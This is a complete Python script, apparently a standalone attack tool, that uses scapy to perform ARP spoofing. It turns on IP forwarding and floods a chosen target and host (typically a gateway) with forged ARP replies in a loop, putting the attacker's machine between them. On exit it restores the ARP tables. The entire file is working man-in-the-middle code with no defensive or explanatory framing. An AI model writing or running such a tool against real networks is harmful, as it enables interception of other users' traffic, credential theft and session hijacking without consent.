import os
import scapy.all as scapy
import time
import optparse

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')


def enter():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target")
    parser.add_option("-r", "--host", dest="host")

    options = parser.parse_args()[0]

    if not options.target:
        parser.error("You must specify a target.")
    if not options.host:
        parser.error("You must specify a host.")
    return options


def scanner(ip_address):
    request_package = scapy.ARP(pdst=ip_address)
    stream_package = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    package = stream_package / request_package
    main_package = scapy.srp(package, timeout=1, verbose=False)[0]

    if len(main_package) == 0:
        print(f"[!] No ARP response received from {ip_address}.")
        return None

    return main_package[0][1].hwsrc


def arp_send(ip_1, ip_2):
    mac_addr = scanner(ip_1)
    if mac_addr is None:
        print(f"[!] MAC address for {ip_1} not found. Skipping packet.")
        return

    arp_package = scapy.ARP(op=2, pdst=ip_1, hwdst=mac_addr, psrc=ip_2)
    scapy.send(arp_package, verbose=False)


def clean_attack(ip_1, ip_2):
    mac_addr = scanner(ip_1)
    other_mac_addr = scanner(ip_2)

    if mac_addr is None or other_mac_addr is None:
        print(f"[!] Could not restore ARP table for {ip_1} or {ip_2}.")
        return

    arp_package = scapy.ARP(op=2, pdst=ip_1, hwdst=mac_addr, psrc=ip_2, hwsrc=other_mac_addr)
    scapy.send(arp_package, verbose=False, count=5)


counter = 0

enter = enter()
target = enter.target
host = enter.host

try:
    while True:
        arp_send(target, host)
        arp_send(host, target)
        counter += 2
        print("\r[+] Sent {} packets".format(counter), end="")
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[!] Exiting and restoring ARP tables...")
    clean_attack(target, host)
    clean_attack(host, target)
